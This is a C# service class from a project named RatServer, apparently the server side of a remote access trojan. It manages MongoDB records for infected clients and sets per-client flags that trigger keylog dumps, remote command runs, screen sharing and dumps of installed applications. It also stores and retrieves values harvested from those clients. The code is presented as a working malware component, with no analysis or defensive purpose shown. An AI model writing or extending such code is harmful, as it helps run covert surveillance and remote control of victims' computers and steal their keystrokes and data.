using AutoMapper;
using MongoDB.Driver;
using RatServer.DataLayer.Interfaces.Client;
using RatServer.DataLayer.Models.Client;
using RatServer.Interfaces.Client;
using RatServer.Models.ViewModel.Client;
using System;
using System.Collections.Generic;
using System.Threading.Tasks;

namespace RatServer.Services.Client
{
    public class ClientService : IClientService
    {
        private readonly IClientRepository clientRepository;
        private readonly IClientValuesRepository clientValuesRepository;
        private readonly IMapper mapper;
        public ClientService(IClientRepository clientRepository,IClientValuesRepository clientValuesRepository,IMapper mapper)
        {
            this.clientRepository = clientRepository;
            this.clientValuesRepository = clientValuesRepository;
            this.mapper = mapper;
        }
        public async Task<ClientVM> Insert(ClientVM clientVM)
        {
            var existing = await clientRepository.FindOneAsync(x => x.clientId.Equals(clientVM.clientId));
            if(existing == null)
            {
                var clientToInsert = mapper.Map<DataLayer.Models.Client.Client>(clientVM);
                var insertedClient = await clientRepository.InsertAsync(clientToInsert);
                return mapper.Map<ClientVM>(insertedClient);
            }

            return mapper.Map<ClientVM>(existing);
        }
        public async Task<bool> Delete(string clientId)
        {
            var selectedClient = await clientRepository.FindOneAsync(x => x.clientId.Equals(clientId));
            await clientRepository.DeleteAsync(selectedClient);
            return true;
        }
        public async Task<ClientVM> Select(string clientId)
        {
            var selectedClient = await clientRepository.FindOneAsync(x => x.clientId.Equals(clientId));
            return mapper.Map<ClientVM>(selectedClient);
        }
        public async Task<List<ClientVM>> SelectAll()
        {
            var clients = await clientRepository.FindManyAsync(x => x.id  != null);
            return mapper.Map<List<ClientVM>>(clients);
        }


        public async Task<bool> IfConnect(string clientId)
        {
            var selectedClient = await clientRepository.FindOneAsync(x => x.clientId.Equals(clientId));
            return selectedClient.ifConnected;
        }
        public async Task<bool> IsRegistered(string clientId)
        {
            var selectedClient = await clientRepository.FindOneAsync(x => x.clientId.Equals(clientId));
            return selectedClient != null ;
        }
        public async Task<bool> IfUpdate(string clientId)
        {
            var selectedClient = await clientRepository.FindOneAsync(x => x.clientId.Equals(clientId));
            return selectedClient.ifUpdate;
        }

        public async Task<bool> IfInstalledAplicationDump(string clientId)
        {
            var selectedClient = await clientRepository.FindOneAsync(x => x.clientId.Equals(clientId));
            return selectedClient.IfInstalledAplicationDump;
        }
        public async Task<bool> IfKeyLogDump (string clientId)
        {
            var selectedClient = await clientRepository.FindOneAsync(x => x.clientId.Equals(clientId));
            return selectedClient.ifKeyLogDump;
        }
        public async Task<bool> IfCMDRun(string clientId)
        {
            var selectedClient = await clientRepository.FindOneAsync(x => x.clientId.Equals(clientId));
            return selectedClient.ifCMDRun;
        }
        public async Task<bool> IfScreenShare(string clientId)
        {
            var selectedClient = await clientRepository.FindOneAsync(x => x.clientId.Equals(clientId));
            return selectedClient.ifScreenShare;
        }


        public async Task<bool> SetAllForNoCMDRun()
        {
            var clients = await clientRepository.FindManyAsync(x => x.ifCMDRun.Equals(true));
            if(clients.Count > 0)
            {
                foreach(DataLayer.Models.Client.Client cl in clients)
                {
                    UpdateDefinition<DataLayer.Models.Client.Client> update = Builders<DataLayer.Models.Client.Client>.
                    Update.Set(p => p.ifCMDRun, false);
                    await clientRepository.UpdateAsync(p => p.id == cl.id, update, null);
                }
            }
            return true;
        }

        public async Task<bool> SetAllForNoConnect()
        {
            var clients = await clientRepository.FindManyAsync(x => x.ifConnected.Equals(true));
            if (clients.Count > 0)
            {
                foreach (DataLayer.Models.Client.Client cl in clients)
                {
                    UpdateDefinition<DataLayer.Models.Client.Client> update = Builders<DataLayer.Models.Client.Client>.
                    Update.Set(p => p.ifConnected, false);
                    await clientRepository.UpdateAsync(p => p.id == cl.id, update, null);
                }
            }
            return true;
        }

        public async Task<bool> SetAllForNoInstalledAplicationDump()
        {
            var clients = await clientRepository.FindManyAsync(x => x.IfInstalledAplicationDump.Equals(true));
            if (clients.Count > 0)
            {
                foreach (DataLayer.Models.Client.Client cl in clients)
                {
                    UpdateDefinition<DataLayer.Models.Client.Client> update = Builders<DataLayer.Models.Client.Client>.
                    Update.Set(p => p.IfInstalledAplicationDump, false);
                    await clientRepository.UpdateAsync(p => p.id == cl.id, update, null);
                }
            }
            return true;
        }

        public async Task<bool> SetAllForNoKeyLogDump()
        {
            var clients = await clientRepository.FindManyAsync(x => x.ifKeyLogDump.Equals(true));
            if (clients.Count > 0)
            {
                foreach (DataLayer.Models.Client.Client cl in clients)
                {
                    UpdateDefinition<DataLayer.Models.Client.Client> update = Builders<DataLayer.Models.Client.Client>.
                    Update.Set(p => p.ifKeyLogDump, false);
                    await clientRepository.UpdateAsync(p => p.id == cl.id, update, null);
                }
            }
            return true;
        }

        public async Task<bool> SetAllForNoScreenShare()
        {
            var clients = await clientRepository.FindManyAsync(x => x.ifScreenShare.Equals(true));
            if (clients.Count > 0)
            {
                foreach (DataLayer.Models.Client.Client cl in clients)
                {
                    UpdateDefinition<DataLayer.Models.Client.Client> update = Builders<DataLayer.Models.Client.Client>.
                    Update.Set(p => p.ifScreenShare, false);
                    await clientRepository.UpdateAsync(p => p.id == cl.id, update, null);
                }
            }
            return true;
        }

        public async Task<bool> SetAllForNoRegistered()
        {
            var clients = await clientRepository.FindManyAsync(x => x.ifRegistered.Equals(true));
            if (clients.Count > 0)
            {
                foreach (DataLayer.Models.Client.Client cl in clients)
                {
                    UpdateDefinition<DataLayer.Models.Client.Client> update = Builders<DataLayer.Models.Client.Client>.
                    Update.Set(p => p.ifRegistered, false);
                    await clientRepository.UpdateAsync(p => p.id == cl.id, update, null);
                }
            }
            return true;
        }

        public async Task<bool> SetAllForNoUpdate()
        {
            var clients = await clientRepository.FindManyAsync(x => x.ifUpdate.Equals(true));
            if (clients.Count > 0)
            {
                foreach (DataLayer.Models.Client.Client cl in clients)
                {
                    UpdateDefinition<DataLayer.Models.Client.Client> update = Builders<DataLayer.Models.Client.Client>.
                    Update.Set(p => p.ifUpdate, false);
                    await clientRepository.UpdateAsync(p => p.id == cl.id, update, null);
                }
            }
            return true;
        }

        public async Task<bool> SetForCMDRun(string clientId)
        {
            UpdateDefinition<DataLayer.Models.Client.Client> update = Builders<DataLayer.Models.Client.Client>.
            Update.Set(p => p.ifCMDRun, true);
            await clientRepository.UpdateAsync(p => p.clientId == clientId, update, null);
            return true;
        }

        public async Task<bool> SetForConnect(string clientId)
        {
            UpdateDefinition<DataLayer.Models.Client.Client> update = Builders<DataLayer.Models.Client.Client>.
            Update.Set(p => p.ifConnected, true);
            await clientRepository.UpdateAsync(p => p.clientId == clientId, update, null);
            return true;
        }

        public async Task<bool> SetForAplicationDump(string clientId)
        {
            UpdateDefinition<DataLayer.Models.Client.Client> update = Builders<DataLayer.Models.Client.Client>.
          Update.Set(p => p.IfInstalledAplicationDump, true);
            await clientRepository.UpdateAsync(p => p.clientId == clientId, update, null);
            return true;
        }

        public async Task<bool> SetForKeyLogDump(string clientId)
        {
            UpdateDefinition<DataLayer.Models.Client.Client> update = Builders<DataLayer.Models.Client.Client>.
          Update.Set(p => p.ifKeyLogDump, true);
            await clientRepository.UpdateAsync(p => p.clientId == clientId, update, null);
            return true;
        }

        public async Task<bool> SetForScreenShare(string clientId)
        {
            UpdateDefinition<DataLayer.Models.Client.Client> update = Builders<DataLayer.Models.Client.Client>.
          Update.Set(p => p.ifScreenShare, true);
            await clientRepository.UpdateAsync(p => p.clientId == clientId, update, null);
            return true;
        }

        public async Task<bool> SetForRegistered(string clientId)
        {
            UpdateDefinition<DataLayer.Models.Client.Client> update = Builders<DataLayer.Models.Client.Client>.
         Update.Set(p => p.ifRegistered, true);
            await clientRepository.UpdateAsync(p => p.clientId == clientId, update, null);
            return true;
        }

        public async Task<bool> SetForUpdate(string clientId)
        {
            UpdateDefinition<DataLayer.Models.Client.Client> update = Builders<DataLayer.Models.Client.Client>.
            Update.Set(p => p.ifUpdate, true);
            await clientRepository.UpdateAsync(p => p.clientId == clientId, update, null);
            return true;
        }

        public async Task<bool> SetForNoUpdate(string clientId)
        {
            UpdateDefinition<DataLayer.Models.Client.Client> update = Builders<DataLayer.Models.Client.Client>.
            Update.Set(p => p.ifUpdate, false);
            await clientRepository.UpdateAsync(p => p.clientId == clientId, update, null);
            return true;
        }
        public async Task<bool> SetForApplicationDump(string clientId)
        {
            UpdateDefinition<DataLayer.Models.Client.Client> update = Builders<DataLayer.Models.Client.Client>.
           Update.Set(p => p.IfInstalledAplicationDump, true);
            await clientRepository.UpdateAsync(p => p.clientId == clientId, update, null);
            return true;
        }
        public async Task<bool> SetForNoApplicationDump (string clientId)
        {
            UpdateDefinition<DataLayer.Models.Client.Client> update = Builders<DataLayer.Models.Client.Client>.
           Update.Set(p => p.IfInstalledAplicationDump, false);
            await clientRepository.UpdateAsync(p => p.clientId == clientId, update, null);
            return true;
        }

        public async Task<bool> SetForNoCMDRun(string clientId)
        {
            UpdateDefinition<DataLayer.Models.Client.Client> update = Builders<DataLayer.Models.Client.Client>.
           Update.Set(p => p.ifCMDRun, false);
            await clientRepository.UpdateAsync(p => p.clientId== clientId, update, null);
            return true;
        }

        public async Task<bool> SetForNoConnect(string clientId)
        {
            UpdateDefinition<DataLayer.Models.Client.Client> update = Builders<DataLayer.Models.Client.Client>.
           Update.Set(p => p.ifConnected, false);
            await clientRepository.UpdateAsync(p => p.clientId == clientId, update, null);
            return true;
        }

        public async Task<bool> SetForNoKeyLogDump(string clientId)
        {
            UpdateDefinition<DataLayer.Models.Client.Client> update = Builders<DataLayer.Models.Client.Client>.
           Update.Set(p => p.ifKeyLogDump, false);
            await clientRepository.UpdateAsync(p => p.clientId == clientId, update, null);
            return true;
        }

        public async Task<bool> SetForNoKeyScreenShare(string clientId)
        {
            UpdateDefinition<DataLayer.Models.Client.Client> update = Builders<DataLayer.Models.Client.Client>.
           Update.Set(p => p.ifScreenShare, false);
            await clientRepository.UpdateAsync(p => p.clientId == clientId, update, null);
            return true;
        }

        public async Task<bool> SetForNoRegistered(string clientId)
        {
            UpdateDefinition<DataLayer.Models.Client.Client> update = Builders<DataLayer.Models.Client.Client>.
           Update.Set(p => p.ifRegistered, false);
            await clientRepository.UpdateAsync(p => p.clientId == clientId, update, null);
            return true;
        }

        public async Task<bool> RegisterValue(string clientId, string data, string value)
        {
            ClientValues clientValues = new ClientValues() { 
             clientId = clientId,
              value = value,
               data = data,
               createdOn = DateTime.Now
            };
            await clientValuesRepository.InsertAsync(clientValues);
            return true;
        }
        public async Task<List<string>> GetValues(string clientId,string data)
        {
            var values = await clientValuesRepository.FindManyAsync(x => x.clientId.Equals(clientId) && x.data.Contains(data));
           
            return values.ConvertAll(x => x.value);
        }

    }
}
